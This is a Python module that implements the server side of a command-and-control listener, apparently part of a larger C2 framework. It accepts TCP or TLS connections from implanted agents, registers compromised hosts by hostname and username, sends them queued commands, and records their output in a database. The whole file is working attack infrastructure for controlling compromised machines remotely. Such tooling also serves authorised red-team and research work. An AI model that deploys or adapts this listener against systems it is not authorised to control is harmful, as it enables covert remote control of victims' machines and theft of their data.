"""
Raw TCP C2 Listener — line-based command/result protocol.

Agents connect over a plain (or optionally TLS-wrapped) TCP socket.
The protocol is a simple newline-delimited JSON stream:

  Agent → Server:  {"type": "checkin", "hostname": "...", "username": "...", ...}
  Server → Agent:  {"task_id": "...", "command": "..."}
  Agent → Server:  {"type": "result", "task_id": "...", "output": "...", "success": true}
  Server → Agent:  {"status": "ok"}

Configuration keys (extra_config):
  tcp_tls     – "true" | "false" (default: false) — wrap with TLS
  tcp_banner  – optional banner line sent to connecting clients
"""

import json
import logging
import socket
import ssl
import threading
import uuid
from datetime import datetime, timezone

logger = logging.getLogger(__name__)


def _utcnow():
    return datetime.now(timezone.utc)


def _send_json(sock: socket.socket, obj: dict):
    data = json.dumps(obj, default=str) + "\n"
    sock.sendall(data.encode())


def _recv_line(sock: socket.socket, max_bytes: int = 65536) -> str | None:
    buf = b""
    while len(buf) < max_bytes:
        try:
            ch = sock.recv(1)
        except Exception:
            return None
        if not ch:
            return None
        if ch == b"\n":
            break
        buf += ch
    return buf.decode(errors="replace").strip()


def _handle_tcp_client(conn: socket.socket, addr: tuple, listener_id: int, flask_app,
                       banner: str | None):
    source_ip, source_port = addr[0], addr[1]
    logger.debug("TCP: connection from %s:%s", source_ip, source_port)

    try:
        if banner:
            try:
                conn.sendall((banner + "\n").encode())
            except Exception:
                return

        conn.settimeout(30.0)

        # ── Record raw callback ──────────────────────────────────────────
        with flask_app.app_context():
            try:
                from models import db, Callback
                cb = Callback(
                    listener_id=listener_id,
                    source_ip=source_ip,
                    source_port=source_port,
                    hostname=None,
                    user_agent="TCP/raw",
                    request_method="TCP",
                    request_path="/",
                    request_headers=json.dumps({}),
                    request_body=None,
                    timestamp=_utcnow(),
                )
                db.session.add(cb)
                db.session.commit()
            except Exception:
                logger.exception("TCP: failed to record callback")
                try:
                    from models import db
                    db.session.rollback()
                except Exception:
                    pass

        # ── Protocol loop ────────────────────────────────────────────────
        agent_id: str | None = None

        while True:
            line = _recv_line(conn)
            if line is None:
                break

            try:
                msg = json.loads(line)
            except (json.JSONDecodeError, ValueError):
                continue

            msg_type = str(msg.get("type", "")).lower()

            if msg_type == "checkin":
                with flask_app.app_context():
                    from models import db, Agent

                    hostname = str(msg.get("hostname", ""))[:256]
                    username = str(msg.get("username", ""))[:256]
                    os_info = str(msg.get("os", ""))[:512]
                    internal_ip = source_ip

                    existing = Agent.query.filter_by(
                        hostname=hostname, username=username, internal_ip=internal_ip
                    ).first()

                    now = _utcnow()
                    if existing:
                        existing.last_seen = now
                        existing.status = "active"
                        existing.listener_id = listener_id
                        db.session.commit()
                        agent_id = existing.id
                        sleep_interval = existing.sleep_interval
                        jitter = existing.jitter
                    else:
                        agent_id = str(uuid.uuid4())
                        agent = Agent(
                            id=agent_id,
                            hostname=hostname,
                            username=username,
                            os_info=os_info,
                            internal_ip=internal_ip,
                            external_ip=source_ip,
                            listener_id=listener_id,
                            status="active",
                            first_seen=now,
                            last_seen=now,
                        )
                        db.session.add(agent)
                        db.session.commit()
                        sleep_interval = agent.sleep_interval
                        jitter = agent.jitter

                _send_json(conn, {
                    "agent_id": agent_id,
                    "sleep": sleep_interval,
                    "jitter": jitter,
                })

            elif msg_type == "beacon":
                if not agent_id:
                    agent_id = str(msg.get("agent_id", ""))[:36] or None

                if agent_id:
                    with flask_app.app_context():
                        from models import db, Agent, AgentTask

                        agent = Agent.query.get(agent_id)
                        if agent:
                            agent.last_seen = _utcnow()
                            agent.status = "active"

                        tasks = AgentTask.query.filter_by(
                            agent_id=agent_id, status="queued"
                        ).order_by(AgentTask.created_at.asc()).all()

                        task_list = []
                        for t in tasks:
                            task_list.append({"id": t.id, "command": t.command, "type": t.task_type})
                            t.status = "sent"
                            t.sent_at = _utcnow()
                        db.session.commit()

                    _send_json(conn, {"tasks": task_list})
                else:
                    _send_json(conn, {"tasks": []})

            elif msg_type == "result":
                task_id = str(msg.get("task_id", ""))[:36]
                output = str(msg.get("output", msg.get("result", "")))[:50_000]
                success = bool(msg.get("success", True))

                if task_id and agent_id:
                    with flask_app.app_context():
                        from models import db, Agent, AgentTask

                        agent = Agent.query.get(agent_id)
                        if agent:
                            agent.last_seen = _utcnow()

                        task = AgentTask.query.get(task_id)
                        if task and task.agent_id == agent_id:
                            task.result = output
                            task.success = success
                            task.status = "completed"
                            task.completed_at = _utcnow()
                        db.session.commit()

                _send_json(conn, {"status": "ok"})

            else:
                # Unknown message — ack and continue
                _send_json(conn, {"status": "unknown"})

    except Exception:
        logger.exception("TCP: session error for %s", source_ip)
    finally:
        try:
            conn.close()
        except Exception:
            pass


class TCPListenerThread(threading.Thread):
    """Accept loop for the raw TCP listener."""

    def __init__(self, sock: socket.socket, listener_id: int, flask_app,
                 banner: str | None, tls_context: ssl.SSLContext | None):
        super().__init__(daemon=True, name=f"tcp-listener-{listener_id}")
        self._sock = sock
        self._listener_id = listener_id
        self._flask_app = flask_app
        self._banner = banner
        self._tls_ctx = tls_context
        self._stop_event = threading.Event()

    def run(self):
        self._sock.listen(16)
        logger.info("TCP listener %s accepting connections", self._listener_id)

        while not self._stop_event.is_set():
            self._sock.settimeout(1.0)
            try:
                client_sock, addr = self._sock.accept()
            except socket.timeout:
                continue
            except Exception:
                if not self._stop_event.is_set():
                    logger.exception("TCP: accept error")
                break

            if self._tls_ctx:
                try:
                    client_sock = self._tls_ctx.wrap_socket(client_sock, server_side=True)
                except ssl.SSLError as exc:
                    logger.warning("TCP/TLS: handshake failed from %s: %s", addr, exc)
                    try:
                        client_sock.close()
                    except Exception:
                        pass
                    continue

            t = threading.Thread(
                target=_handle_tcp_client,
                args=(client_sock, addr, self._listener_id, self._flask_app, self._banner),
                daemon=True,
            )
            t.start()

        try:
            self._sock.close()
        except Exception:
            pass
        logger.info("TCP listener %s stopped", self._listener_id)

    def shutdown(self):
        self._stop_event.set()


def start_tcp_listener(listener_row, flask_app) -> "TCPListenerThread":
    """Create and start a TCPListenerThread for *listener_row*."""
    extra: dict = {}
    try:
        extra = json.loads(listener_row.extra_config or "{}") or {}
    except (ValueError, TypeError):
        pass

    banner = extra.get("tcp_banner") or None
    use_tls = str(extra.get("tcp_tls", "false")).lower() == "true"

    tls_ctx: ssl.SSLContext | None = None
    if use_tls:
        cert = listener_row.tls_cert_path
        key = listener_row.tls_key_path
        if cert and key:
            tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            tls_ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            tls_ctx.load_cert_chain(cert, key)
        else:
            logger.warning("TCP/TLS requested but no cert/key paths set for listener %s", listener_row.id)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((listener_row.bind_address, listener_row.bind_port))

    thread = TCPListenerThread(
        sock=sock,
        listener_id=listener_row.id,
        flask_app=flask_app,
        banner=banner,
        tls_context=tls_ctx,
    )
    thread.start()
    return thread
